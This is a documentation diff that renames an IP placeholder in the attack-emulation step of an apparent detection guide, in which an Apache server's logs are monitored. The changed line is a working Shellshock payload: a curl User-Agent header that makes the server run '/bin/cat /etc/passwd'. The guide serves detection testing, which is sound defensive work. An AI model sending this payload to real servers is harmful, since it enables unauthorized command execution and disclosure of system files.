@@ -66,11 +66,11 @@ Perform the following steps to install an Apache web server and monitor its logs
 Attack emulation
 ----------------
 
-#. Replace ``<WEBSERVER_IP>`` with the Ubuntu IP address and execute the following command from the attacker endpoint:
+#. Replace ``<WEBSERVER_IP_ADDRESS>`` with the Ubuntu IP address and execute the following command from the attacker endpoint:
 
    .. code-block:: console
 
-      $ sudo curl -H "User-Agent: () { :; }; /bin/cat /etc/passwd" <WEBSERVER-IP>
+      $ sudo curl -H "User-Agent: () { :; }; /bin/cat /etc/passwd" <WEBSERVER_IP_ADDRESS>
 
 Visualize the alerts
 --------------------
